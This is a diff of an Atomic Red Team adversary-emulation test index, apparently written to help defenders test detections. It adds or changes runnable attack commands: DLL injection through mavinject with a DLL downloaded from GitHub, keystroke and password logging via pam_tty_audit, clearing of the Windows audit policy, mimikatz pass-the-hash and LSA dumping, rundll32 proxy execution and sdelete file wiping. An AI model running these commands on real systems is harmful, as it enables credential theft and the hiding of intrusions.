@@ -2672,7 +2672,43 @@ privilege-escalation:
       x_mitre_is_subtechnique: true
       x_mitre_platforms:
       - Windows
-    atomic_tests: []
+      identifier: T1055.001
+    atomic_tests:
+    - name: Process Injection via mavinject.exe
+      auto_generated_guid: 74496461-11a1-4982-b439-4d87a550d254
+      description: |
+        Windows 10 Utility To Inject DLLS.
+
+        Upon successful execution, powershell.exe will download T1055.dll to disk. Powershell will then spawn mavinject.exe to perform process injection in T1055.dll.
+        With default arguments, expect to see a MessageBox, with notepad's icon in taskbar.
+      supported_platforms:
+      - windows
+      input_arguments:
+        process_id:
+          description: PID of input_arguments
+          type: Integer
+          default: "(Start-Process notepad -PassThru).id"
+        dll_payload:
+          description: DLL to Inject
+          type: Path
+          default: PathToAtomicsFolder\T1055.001\src\x64\T1055.001.dll
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Utility to inject must exist on disk at specified location (#{dll_payload})
+
+'
+        prereq_command: 'if (Test-Path #{dll_payload}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
+          New-Item -Type Directory (split-path #{dll_payload}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.001/src/x64/T1055.001.dll" -OutFile "#{dll_payload}"
+      executor:
+        command: |
+          $mypid = #{process_id}
+          mavinject $mypid /INJECTRUNNING #{dll_payload}
+        name: powershell
+        elevation_required: true
   T1548.004:
     technique:
       external_references:
@@ -5901,41 +5937,6 @@ privilege-escalation:
       x_mitre_is_subtechnique: false
       identifier: T1055
     atomic_tests:
-    - name: Process Injection via mavinject.exe
-      auto_generated_guid: 74496461-11a1-4982-b439-4d87a550d254
-      description: |
-        Windows 10 Utility To Inject DLLS.
-
-        Upon successful execution, powershell.exe will download T1055.dll to disk. Powershell will then spawn mavinject.exe to perform process injection in T1055.dll.
-        With default arguments, expect to see a MessageBox, with notepad's icon in taskbar.
-      supported_platforms:
-      - windows
-      input_arguments:
-        process_id:
-          description: PID of input_arguments
-          type: Integer
-          default: "(Start-Process notepad -PassThru).id"
-        dll_payload:
-          description: DLL to Inject
-          type: Path
-          default: PathToAtomicsFolder\T1055\src\x64\T1055.dll
-      dependency_executor_name: powershell
-      dependencies:
-      - description: 'Utility to inject must exist on disk at specified location (#{dll_payload})
-
-'
-        prereq_command: 'if (Test-Path #{dll_payload}) {exit 0} else {exit 1}
-
-'
-        get_prereq_command: |
-          New-Item -Type Directory (split-path #{dll_payload}) -ErrorAction ignore | Out-Null
-          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055/src/x64/T1055.dll" -OutFile "#{dll_payload}"
-      executor:
-        command: |
-          $mypid = #{process_id}
-          mavinject $mypid /INJECTRUNNING #{dll_payload}
-        name: powershell
-        elevation_required: true
     - name: Shellcode execution via VBA
       auto_generated_guid: 1c91e740-1729-4329-b779-feba6e71d048
       description: |
@@ -6017,7 +6018,7 @@ privilege-escalation:
           New-Item -ItemType Directory (Split-Path "#{psexec_path}") -Force | Out-Null
           Copy-Item $env:TEMP\PsTools\PsExec.exe "#{psexec_path}" -Force
       executor:
-        command: '#{psexec_path} /accepteula \\#{machine} -s -c #{mimikatz_path} "lsadump::lsa
+        command: '#{psexec_path} /accepteula \\#{machine} -c #{mimikatz_path} "lsadump::lsa
           /inject /id:500" "exit"
 
 '
@@ -20039,6 +20040,40 @@ credential-access:
 '
         name: powershell
         elevation_required: true
+    - name: Living off the land Terminal Input Capture on Linux with pam.d
+      auto_generated_guid: 9c6bdb34-a89f-4b90-acb1-5970614c711b
+      description: "Pluggable Access Module, which is present on all modern Linux
+        systems, generally contains a library called pam_tty_audit.so which logs all
+        keystrokes for the selected users and sends it to audit.log.  All terminal
+        activity on any new logins would then be archived and readable by an adversary
+        with elevated privledges.\n\nPasswords hidden by the console can also be logged,
+        with 'log_passwd' as in this example.  If root logging is enabled, then output
+        from any process which is later started by root is also logged, even if this
+        policy is carefully enabled (e.g. 'disable=*' as the initial command).\n\nUse
+        'aureport --tty' or other audit.d reading tools to read the log output, which
+        is binary.  Mac OS does not currently contain the pam_tty_audit.so library.
+        \n"
+      prereq_command: 'test -f ''/usr/lib/pam/pam_tty_audit.so -o  /usr/lib64/security/pam_tty_audit.so''
+
+'
+      get_prereq_command: 'echo "Sorry, you must install module pam_tty_audit.so and
+        recompile, for this test to work"
+
+'
+      supported_platforms:
+      - linux
+      executor:
+        command: if sudo test -f /etc/pam.d/password-auth; then sudo cp /etc/pam.d/password-auth
+          /tmp/password-auth.bk; fi; if sudo test -f /etc/pam.d/system-auth; then
+          sudo cp /etc/pam.d/system-auth /tmp/system-auth.bk; fi; sudo touch /tmp/password-auth.bk
+          sudo touch /tmp/system-auth.bk sudo echo "session    required    pam_tty_audit.so
+          enable=* log_password" >> /etc/pam.d/password-auth sudo echo "session    required    pam_tty_audit.so
+          enable=* log_password" >> /etc/pam.d/system-auth
+        cleanup_command: |
+          sudo cp -f /tmp/password-auth.bk /etc/pam.d/password-auth
+          sudo cp -f /tmp/system-auth.bk /etc/pam.d/system-auth
+        name: sh
+        elevation_required: true
   T1557.001:
     technique:
       external_references:
@@ -24751,6 +24786,40 @@ collection:
 '
         name: powershell
         elevation_required: true
+    - name: Living off the land Terminal Input Capture on Linux with pam.d
+      auto_generated_guid: 9c6bdb34-a89f-4b90-acb1-5970614c711b
+      description: "Pluggable Access Module, which is present on all modern Linux
+        systems, generally contains a library called pam_tty_audit.so which logs all
+        keystrokes for the selected users and sends it to audit.log.  All terminal
+        activity on any new logins would then be archived and readable by an adversary
+        with elevated privledges.\n\nPasswords hidden by the console can also be logged,
+        with 'log_passwd' as in this example.  If root logging is enabled, then output
+        from any process which is later started by root is also logged, even if this
+        policy is carefully enabled (e.g. 'disable=*' as the initial command).\n\nUse
+        'aureport --tty' or other audit.d reading tools to read the log output, which
+        is binary.  Mac OS does not currently contain the pam_tty_audit.so library.
+        \n"
+      prereq_command: 'test -f ''/usr/lib/pam/pam_tty_audit.so -o  /usr/lib64/security/pam_tty_audit.so''
+
+'
+      get_prereq_command: 'echo "Sorry, you must install module pam_tty_audit.so and
+        recompile, for this test to work"
+
+'
+      supported_platforms:
+      - linux
+      executor:
+        command: if sudo test -f /etc/pam.d/password-auth; then sudo cp /etc/pam.d/password-auth
+          /tmp/password-auth.bk; fi; if sudo test -f /etc/pam.d/system-auth; then
+          sudo cp /etc/pam.d/system-auth /tmp/system-auth.bk; fi; sudo touch /tmp/password-auth.bk
+          sudo touch /tmp/system-auth.bk sudo echo "session    required    pam_tty_audit.so
+          enable=* log_password" >> /etc/pam.d/password-auth sudo echo "session    required    pam_tty_audit.so
+          enable=* log_password" >> /etc/pam.d/system-auth
+        cleanup_command: |
+          sudo cp -f /tmp/password-auth.bk /etc/pam.d/password-auth
+          sudo cp -f /tmp/system-auth.bk /etc/pam.d/system-auth
+        name: sh
+        elevation_required: true
   T1557.001:
     technique:
       external_references:
@@ -28941,6 +29010,8 @@ defense-evasion:
       description: |
         Disables HTTP logging on a Windows IIS web server as seen by Threat Group 3390 (Bronze Union).
         This action requires HTTP logging configurations in IIS to be unlocked.
+
+        Use the cleanup commands to restore some default auditpol settings (your original settings will be lost)
       supported_platforms:
       - windows
       input_arguments:
@@ -28990,6 +29061,22 @@ defense-evasion:
           auditpol /set /category:"Account Logon" /success:disable /failure:disable
           auditpol /set /category:"Logon/Logoff" /success:disable /failure:disable
           auditpol /set /category:"Detailed Tracking" /success:disable
+        cleanup_command: |
+          auditpol /set /category:"Account Logon" /success:enable /failure:enable
+          auditpol /set /category:"Detailed Tracking" /success:enable
+          auditpol /set /category:"Logon/Logoff" /success:enable /failure:enable
+        name: command_prompt
+        elevation_required: true
+    - name: Clear Windows Audit Policy Config
+      auto_generated_guid: 913c0e4e-4b37-4b78-ad0b-90e7b25010f6
+      description: Clear the Windows audit policy using auditpol utility. This action
+        would stop certain audit events from being recorded in the security log.
+      supported_platforms:
+      - windows
+      executor:
+        command: |
+          auditpol /clear /y
+          auditpol /remove /allusers
         cleanup_command: |
           auditpol /set /category:"Account Logon" /success:enable /failure:enable
           auditpol /set /category:"Detailed Tracking" /success:enable
@@ -30074,7 +30161,43 @@ defense-evasion:
       x_mitre_is_subtechnique: true
       x_mitre_platforms:
       - Windows
-    atomic_tests: []
+      identifier: T1055.001
+    atomic_tests:
+    - name: Process Injection via mavinject.exe
+      auto_generated_guid: 74496461-11a1-4982-b439-4d87a550d254
+      description: |
+        Windows 10 Utility To Inject DLLS.
+
+        Upon successful execution, powershell.exe will download T1055.dll to disk. Powershell will then spawn mavinject.exe to perform process injection in T1055.dll.
+        With default arguments, expect to see a MessageBox, with notepad's icon in taskbar.
+      supported_platforms:
+      - windows
+      input_arguments:
+        process_id:
+          description: PID of input_arguments
+          type: Integer
+          default: "(Start-Process notepad -PassThru).id"
+        dll_payload:
+          description: DLL to Inject
+          type: Path
+          default: PathToAtomicsFolder\T1055.001\src\x64\T1055.001.dll
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Utility to inject must exist on disk at specified location (#{dll_payload})
+
+'
+        prereq_command: 'if (Test-Path #{dll_payload}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
+          New-Item -Type Directory (split-path #{dll_payload}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.001/src/x64/T1055.001.dll" -OutFile "#{dll_payload}"
+      executor:
+        command: |
+          $mypid = #{process_id}
+          mavinject $mypid /INJECTRUNNING #{dll_payload}
+        name: powershell
+        elevation_required: true
   T1548.004:
     technique:
       external_references:
@@ -35959,8 +36082,10 @@ defense-evasion:
           New-Item -ItemType Directory (Split-Path $mimikatz_path) -Force | Out-Null
           Move-Item $env:TEMP\mimikatz\x64\mimikatz.exe $mimikatz_path -Force
       executor:
-        command: "#{mimikatz_path} sekurlsa::pth /user:#{user_name} /domain:#{domain}
-          /ntlm:#{ntlm}\n"
+        command: '#{mimikatz_path} "sekurlsa::pth /user:#{user_name} /domain:#{domain}
+          /ntlm:#{ntlm}"
+
+'
         name: command_prompt
     - name: crackmapexec Pass the Hash
       auto_generated_guid: eb05b028-16c8-4ad8-adea-6f5b219da9a9
@@ -37164,41 +37289,6 @@ defense-evasion:
       x_mitre_is_subtechnique: false
       identifier: T1055
     atomic_tests:
-    - name: Process Injection via mavinject.exe
-      auto_generated_guid: 74496461-11a1-4982-b439-4d87a550d254
-      description: |
-        Windows 10 Utility To Inject DLLS.
-
-        Upon successful execution, powershell.exe will download T1055.dll to disk. Powershell will then spawn mavinject.exe to perform process injection in T1055.dll.
-        With default arguments, expect to see a MessageBox, with notepad's icon in taskbar.
-      supported_platforms:
-      - windows
-      input_arguments:
-        process_id:
-          description: PID of input_arguments
-          type: Integer
-          default: "(Start-Process notepad -PassThru).id"
-        dll_payload:
-          description: DLL to Inject
-          type: Path
-          default: PathToAtomicsFolder\T1055\src\x64\T1055.dll
-      dependency_executor_name: powershell
-      dependencies:
-      - description: 'Utility to inject must exist on disk at specified location (#{dll_payload})
-
-'
-        prereq_command: 'if (Test-Path #{dll_payload}) {exit 0} else {exit 1}
-
-'
-        get_prereq_command: |
-          New-Item -Type Directory (split-path #{dll_payload}) -ErrorAction ignore | Out-Null
-          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055/src/x64/T1055.dll" -OutFile "#{dll_payload}"
-      executor:
-        command: |
-          $mypid = #{process_id}
-          mavinject $mypid /INJECTRUNNING #{dll_payload}
-        name: powershell
-        elevation_required: true
     - name: Shellcode execution via VBA
       auto_generated_guid: 1c91e740-1729-4329-b779-feba6e71d048
       description: |
@@ -37280,7 +37370,7 @@ defense-evasion:
           New-Item -ItemType Directory (Split-Path "#{psexec_path}") -Force | Out-Null
           Copy-Item $env:TEMP\PsTools\PsExec.exe "#{psexec_path}" -Force
       executor:
-        command: '#{psexec_path} /accepteula \\#{machine} -s -c #{mimikatz_path} "lsadump::lsa
+        command: '#{psexec_path} /accepteula \\#{machine} -c #{mimikatz_path} "lsadump::lsa
           /inject /id:500" "exit"
 
 '
@@ -39011,6 +39101,24 @@ defense-evasion:
         command: |
           rundll32.exe url.dll,OpenURL PathToAtomicsFolder\T1218.011\src\index.hta
           rundll32.exe URL.dll,FileProtocolHandler PathToAtomicsFolder\T1218.011\src\akteullen.vbs
+        name: command_prompt
+    - name: Launches an executable using Rundll32 and pcwutl.dll
+      auto_generated_guid: 9f5d081a-ee5a-42f9-a04e-b7bdc487e676
+      description: 'Executes the LaunchApplication function in pcwutl.dll to proxy
+        execution of an executable.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        exe_to_launch:
+          description: Path of the executable to launch
+          type: path
+          default: "%windir%\\System32\\notepad.exe"
+      executor:
+        command: 'rundll32.exe pcwutl.dll,LaunchApplication #{exe_to_launch}
+
+'
         name: command_prompt
   T1134.005:
     technique:
@@ -42919,20 +43027,10 @@ impact:
           Invoke-WebRequest "https://download.sysinternals.com/files/SDelete.zip" -OutFile "$env:TEMP\SDelete.zip"
           Expand-Archive $env:TEMP\SDelete.zip $env:TEMP\Sdelete -Force
           Remove-Item $env:TEMP\SDelete.zip -Force
-      - description: 'The file to delete must exist at #{file_to_delete}
-
-'
-        prereq_command: 'if (Test-Path #{file_to_delete}) { exit 0 } else { exit 1
-          }
-
-'
-        get_prereq_command: 'New-Item #{file_to_delete} -Force | Out-Null
-
-'
       executor:
-        command: 'Invoke-Expression -Command "#{sdelete_exe} -accepteula #{file_to_delete}"
-
-'
+        command: |
+          if (-not (Test-Path #{file_to_delete})) { New-Item #{file_to_delete} -Force }
+          Invoke-Expression -Command "#{sdelete_exe} -accepteula #{file_to_delete}"
         name: powershell
     - name: macOS/Linux - Overwrite file with DD
       auto_generated_guid: 38deee99-fd65-4031-bec8-bfa4f9f26146
@@ -46166,7 +46264,6 @@ discovery:
 '
       supported_platforms:
       - linux
-      - macos
       input_arguments:
         output_file:
           description: Path where captured results will be placed
@@ -55426,6 +55523,31 @@ execution:
 
 '
         name: powershell
+    - name: Writes text to a file and displays it.
+      auto_generated_guid: 127b4afe-2346-4192-815c-69042bec570e
+      description: 'Writes text to a file and display the results. This test is intended
+        to emulate the dropping of a malicious file to disk.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        file_contents_path:
+          description: Path to the file that the command prompt will drop.
+          type: path
+          default: "%TEMP%\\test.bin"
+        message:
+          description: Message that will be written to disk and then displayed.
+          type: string
+          default: Hello from the Windows Command Prompt!
+      executor:
+        command: 'echo "#{message}" > "#{file_contents_path}" & type "#{file_contents_path}"
+
+'
+        cleanup_command: 'del "#{file_contents_path}"
+
+'
+        name: command_prompt
   T1047:
     technique:
       id: attack-pattern--01a5a209-b94c-450b-b7f9-946497d91055
@@ -56186,8 +56308,10 @@ lateral-movement:
           New-Item -ItemType Directory (Split-Path $mimikatz_path) -Force | Out-Null
           Move-Item $env:TEMP\mimikatz\x64\mimikatz.exe $mimikatz_path -Force
       executor:
-        command: "#{mimikatz_path} sekurlsa::pth /user:#{user_name} /domain:#{domain}
-          /ntlm:#{ntlm}\n"
+        command: '#{mimikatz_path} "sekurlsa::pth /user:#{user_name} /domain:#{domain}
+          /ntlm:#{ntlm}"
+
+'
         name: command_prompt
     - name: crackmapexec Pass the Hash
       auto_generated_guid: eb05b028-16c8-4ad8-adea-6f5b219da9a9
@@ -56393,11 +56517,9 @@ lateral-movement:
     atomic_tests:
     - name: RDP hijacking
       auto_generated_guid: a37ac520-b911-458e-8aed-c5f1576d9f46
-      description: 'RDP hijacking](https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6)
+      description: "[RDP hijacking](https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6)
         - how to hijack RDS and RemoteApp sessions transparently to move through an
-        organization
-
-'
+        organization\n"
       supported_platforms:
       - windows
       input_arguments:
